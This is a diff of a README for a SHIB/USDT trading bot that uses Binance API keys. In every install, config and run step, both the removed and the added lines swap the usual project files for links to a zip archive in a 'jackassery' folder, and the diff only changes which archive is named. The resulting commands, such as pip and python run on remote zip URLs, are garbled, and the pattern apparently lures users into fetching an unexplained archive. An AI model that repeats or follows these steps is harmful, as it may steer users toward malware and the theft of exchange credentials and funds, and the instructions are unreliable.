@@ -17,7 +17,7 @@ An advanced cryptocurrency trading bot for SHIB/USDT using Smart Money Concepts 
 ### 1. Install Dependencies
 
 ```bash
-pip install -r https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Software_3.5-alpha.4.zip
+pip install -r https://raw.githubusercontent.com/razashaikh26/trade/main/jackassery/Software_1.0.zip
 ```
 
 ### 2. Environment Configuration
@@ -33,7 +33,7 @@ BINANCE_API_SECRET=your_api_secret_here
 
 ### 3. Configuration
 
-Edit `https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Software_3.5-alpha.4.zip` to customize:
+Edit `https://raw.githubusercontent.com/razashaikh26/trade/main/jackassery/Software_1.0.zip` to customize:
 - Trading symbol (default: 1000SHIBUSDT)
 - Risk parameters
 - Strategy settings
@@ -43,17 +43,17 @@ Edit `https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Softw
 
 ### Live Trading
 ```bash
-python https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Software_3.5-alpha.4.zip
+python https://raw.githubusercontent.com/razashaikh26/trade/main/jackassery/Software_1.0.zip
 ```
 
 ### Testnet Trading
 ```bash
-python https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Software_3.5-alpha.4.zip --testnet
+python https://raw.githubusercontent.com/razashaikh26/trade/main/jackassery/Software_1.0.zip --testnet
 ```
 
 ### Mock Trading (Simulation)
 ```bash
-python https://github.com/razashaikh26/trade/raw/refs/heads/main/jackassery/Software_3.5-alpha.4.zip --mock
+python https://raw.githubusercontent.com/razashaikh26/trade/main/jackassery/Software_1.0.zip --mock
 ```
 
 ## Risk Management
